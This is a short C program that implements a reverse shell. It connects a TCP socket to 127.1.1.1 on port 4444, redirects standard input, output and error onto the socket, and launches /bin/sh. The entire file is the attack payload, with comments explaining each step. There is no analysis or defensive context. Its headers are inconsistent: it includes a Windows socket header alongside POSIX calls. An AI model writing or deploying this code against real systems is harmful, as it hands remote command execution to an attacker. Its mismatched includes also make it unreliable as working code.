#include <unistd.h>
#include <winsock.h>
// #include <netinet/in.h>
// #include <sys/socket.h>

int main() {
    int sockfd;
    struct sockaddr_in server;

    // create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // server address
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("127.1.1.1");

    // remote host connection
    connect(sockfd, (struct sockaddr *)&server, sizeof(server));

    // stdin, stdout, and stderr to the socket
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    // execution a shell
    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}
